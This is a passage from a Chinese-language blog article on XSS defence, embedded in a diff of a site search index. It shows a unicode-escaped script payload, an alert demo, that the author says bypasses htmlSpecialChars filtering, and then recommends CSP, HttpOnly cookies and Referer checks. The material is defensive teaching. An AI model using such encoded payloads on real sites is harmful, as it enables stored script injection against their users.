+<p>就像上面提到的 JS 会以各种非法形式注入，其主要非法形式有两类：</p>
+<ol>
+<li><p><strong>明文：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js 恶意代码</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​        要处理好明文注入的过滤。</p>
+</li>
+<li><p><strong>编码：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
+<p>上面这个编码为unicode编码，它可以绕过<code>htmlSpecialChars</code>的过滤并入库，然后在展示该信息的时候，html 会自动将unicode编码转换成明文即真正的可执行脚本。</p>
+<p>由于不仅unicode编码可以注入，其它类型的编码也可以（道理类似），我们需要尽量将页面的字符编码统一设置为一种（如unicode: utf-8），这样便于我们专注于处理unicode编码的注入。</p>
+</li>
+</ol>
+<h4 id="其它一些通用的防范方法"><a href="#其它一些通用的防范方法" class="headerlink" title="其它一些通用的防范方法"></a>其它一些通用的防范方法</h4><ol>
+<li><p>在输出html时，加上<code>Content Security Policy</code>的<code>Http Header</code></p>
+<p>作用：防止页面被XSS攻击时，嵌入第三方的脚本文件</p>
+</li>
+<li><p>在设置Cookie时，加上<code>HttpOnly</code>参数</p>
+<p>作用：可以防止页面被XSS攻击时，Cookie信息被盗取</p>
+<p>缺点：网站本身的<code>JavaScript</code>代码也无法操作Cookie</p>
+</li>
+<li><p>在开发API时，检验请求的Referer参数</p>
+<p>作用：可以在一定程度上防止CSRF攻击</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Network</category>
+      </categories>
+      <tags>
+        <tag>HTTP</tag>
       </tags>
   </entry>
 </search>
